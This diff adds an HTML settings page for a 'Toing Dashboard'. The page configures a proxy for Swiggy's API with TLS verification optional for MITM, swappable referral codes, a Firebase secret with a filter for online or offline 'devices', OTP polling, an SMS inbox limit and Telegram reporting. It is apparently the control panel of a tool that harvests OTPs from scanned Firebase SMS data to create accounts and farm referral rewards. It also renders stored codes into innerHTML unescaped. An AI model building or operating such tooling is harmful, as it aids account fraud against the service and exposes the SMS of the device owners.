@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><title>Toing Settings</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0f172a;color:#e2e8f0}
+.navbar{background:#1e293b;padding:16px 24px;display:flex;gap:24px;align-items:center;border-bottom:1px solid #334155}
+.navbar h1{font-size:20px;color:#38bdf8}
+.navbar a{color:#94a3b8;text-decoration:none;padding:6px 12px;border-radius:6px}
+.navbar a.active{color:#e2e8f0;background:#334155}
+.container{max-width:980px;margin:24px auto;padding:0 24px}
+.card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:20px;margin-bottom:20px}
+.card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
+.card h3{color:#38bdf8;font-size:17px}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+label{display:block;color:#94a3b8;font-size:12px;margin-bottom:5px}
+input,select{width:100%;padding:9px 12px;background:#0f172a;color:#e2e8f0;border:1px solid #334155;border-radius:8px;font-size:14px}
+.check{display:flex;gap:8px;align-items:center;padding-top:20px}
+.check input{width:18px;height:18px}
+.btn{padding:9px 16px;border:none;border-radius:8px;background:#38bdf8;color:#0f172a;font-weight:700;cursor:pointer;font-size:13px}
+.btn-red{background:#ef4444;color:#fff}.btn-green{background:#22c55e}.btn-purple{background:#a855f7;color:#fff}.btn-amber{background:#f59e0b}
+.actions{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
+#result{margin-top:12px;font-size:14px;display:none;padding:14px;background:#0f172a;border:1px solid #334155;border-radius:8px}
+.codes{margin-top:14px}
+.code-row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid #334155;font-size:13px}
+.code-row button{background:#38bdf8;color:#0f172a;border:none;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:12px}
+</style>
+</head>
+<body>
+<nav class="navbar"><h1>🎯 Toing Dashboard</h1>
+<a href="/">Dashboard</a><a href="/logs">Logs</a><a href="/hits">Hits</a>
+<a href="/firebases">Firebase</a><a href="/settings" class="active">Settings</a></nav>
+<div class="container">
+<div class="actions">
+  <button class="btn" onclick="saveAll()">💾 Save All</button>
+  <button class="btn btn-green" onclick="testProxy()">🔌 Test Proxy</button>
+  <button class="btn btn-amber" onclick="resetStats()">♻️ Reset today's stats</button>
+</div>
+
+<div class="card">
+  <div class="card-head"><h3>⚙️ Proxy (Swiggy/Toing API only)</h3><button class="btn btn-red btn-sm" onclick="resetSection('proxy')">Reset</button></div>
+  <div class="grid">
+    <div><label>HTTP Proxy</label><input type="text" data-setting="proxy" value="{{ settings.proxy or '' }}" placeholder="http://user:pass@host:port"></div>
+    <div class="check"><input type="checkbox" data-setting="ssl_verify" data-type="bool" id="ssl" {% if settings.ssl_verify %}checked{% endif %}><label for="ssl">Verify TLS (off for MITM proxies)</label></div>
+  </div>
+  <small style="color:#64748b">Firebase scanning, Telegram and stats stay direct.</small>
+</div>
+
+<div class="card">
+  <div class="card-head"><h3>🔑 Referral</h3><button class="btn btn-red btn-sm" onclick="resetSection('referral')">Reset</button></div>
+  <div class="grid">
+    <div><label>Active referral code</label><input type="text" data-setting="referral_code" value="{{ settings.referral_code }}"></div>
+    <div><label>Campaign ID</label><input type="text" data-setting="campaign_id" value="{{ settings.campaign_id }}"></div>
+    <div><label>Referrer name</label><input type="text" data-setting="referrer_name" value="{{ settings.referrer_name }}"></div>
+    <div><label>Account name (signup)</label><input type="text" data-setting="account_name" value="{{ settings.account_name }}"></div>
+  </div>
+  <div style="margin-top:16px;border-top:1px solid #334155;padding-top:14px">
+    <h4 style="color:#94a3b8;margin-bottom:8px;font-size:13px">Add a new referral code</h4>
+    <div class="grid">
+      <div><label>Code</label><input type="text" id="newcode" placeholder="ABCD1234"></div>
+      <div><label>Referrer name</label><input type="text" id="newname" placeholder="Barshan"></div>
+      <div><label>Campaign</label><input type="text" id="newcamp" placeholder="ToingCampaign"></div>
+    </div>
+    <button class="btn btn-purple" style="margin-top:10px" onclick="addReferral()">➕ Add & activate</button>
+    <div class="codes" id="codes"></div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-head"><h3>🗄 Firebase</h3><button class="btn btn-red btn-sm" onclick="resetSection('firebase')">Reset</button></div>
+  <div class="grid">
+    <div><label>Auth secret</label><input type="text" data-setting="firebase_secret" value="{{ settings.firebase_secret }}"></div>
+    <div><label>Firebase timeout (s)</label><input type="number" data-setting="firebase_timeout" data-type="int" value="{{ settings.firebase_timeout }}"></div>
+    <div><label>Which devices to check</label>
+      <select data-setting="device_filter">
+        <option value="online" {% if settings.device_filter == 'online' %}selected{% endif %}>Online devices only</option>
+        <option value="both" {% if settings.device_filter == 'both' %}selected{% endif %}>Both online and offline</option>
+      </select>
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-head"><h3>🌐 Runtime</h3><button class="btn btn-red btn-sm" onclick="resetSection('runtime')">Reset</button></div>
+  <div class="grid">
+    <div><label>OTP poll timeout (s)</label><input type="number" data-setting="otp_timeout" data-type="int" value="{{ settings.otp_timeout }}"></div>
+    <div><label>OTP poll interval (s)</label><input type="number" data-setting="otp_interval" data-type="int" value="{{ settings.otp_interval }}"></div>
+    <div><label>API request timeout (s)</label><input type="number" data-setting="request_timeout" data-type="int" value="{{ settings.request_timeout }}"></div>
+    <div><label>Inbox SMS limit</label><input type="number" data-setting="sms_limit" data-type="int" value="{{ settings.sms_limit }}"></div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-head"><h3>📱 Telegram (direct)</h3><button class="btn btn-red btn-sm" onclick="resetSection('telegram')">Reset</button></div>
+  <div class="grid">
+    <div><label>Bot token</label><input type="text" data-setting="tg_bot_token" value="{{ settings.tg_bot_token }}"></div>
+    <div><label>Chat ID</label><input type="text" data-setting="tg_chat_id" value="{{ settings.tg_chat_id }}"></div>
+  </div>
+</div>
+
+<div id="result"></div>
+</div>
+<script>
+const CODES = {{ settings.referral_codes|tojson }};
+const ACTIVE = {{ settings.referral_code|tojson }};
+function show(t,c){const e=document.getElementById('result');e.style.display='block';e.innerHTML=t;e.style.color=c;}
+function collect(){
+  const d={};
+  document.querySelectorAll('[data-setting]').forEach(el=>{
+    const k=el.dataset.setting,t=el.dataset.type;
+    if(t==='bool')d[k]=el.checked; else if(t==='int')d[k]=parseInt(el.value)||0; else d[k]=el.value;
+  });
+  return d;
+}
+function saveAll(){
+  fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(collect())})
+   .then(r=>r.json()).then(()=>{show('✅ Settings saved','#4ade80');setTimeout(()=>location.reload(),600);});
+}
+function resetSection(s){
+  if(!confirm('Reset this section to defaults?'))return;
+  fetch('/api/settings/reset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({section:s})}).then(()=>location.reload());
+}
+function resetStats(){
+  if(!confirm("Reset today's counters?"))return;
+  fetch('/api/stats/reset',{method:'POST'}).then(()=>{show("✅ Counters reset",'#4ade80');});
+}
+function testProxy(){
+  const p=document.querySelector('[data-setting="proxy"]').value.trim();
+  show('⏳ Testing Swiggy via proxy...','#94a3b8');
+  fetch('/api/test_proxy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxy:p})})
+   .then(r=>r.json()).then(d=>show(d.status==='success'?('✅ Swiggy reachable via proxy — HTTP '+d.http+', '+d.bytes+' bytes'):('❌ '+d.message),d.status==='success'?'#4ade80':'#f87171'));
+}
+function addReferral(){
+  const code=document.getElementById('newcode').value.trim().toUpperCase();
+  if(!code){show('⚠️ Enter a code','#facc15');return;}
+  fetch('/api/referral/add',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({code:code,referrer_name:document.getElementById('newname').value.trim(),campaign_id:document.getElementById('newcamp').value.trim()})})
+   .then(r=>r.json()).then(d=>{if(d.status==='success')location.reload();else show('❌ '+d.message,'#f87171');});
+}
+function renderCodes(){
+  document.getElementById('codes').innerHTML=CODES.map(c=>'<div class="code-row"><span>'+c.code+' — '+c.referrer_name+' ('+c.campaign_id+')'+(c.code===ACTIVE?' ✅ ACTIVE':'')+'</span><button onclick="useCode(\''+c.code+'\')">Use</button></div>').join('');
+}
+function useCode(code){
+  fetch('/api/referral/use',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code})}).then(()=>location.reload());
+}
+renderCodes();
+</script>
+</body>
+</html>
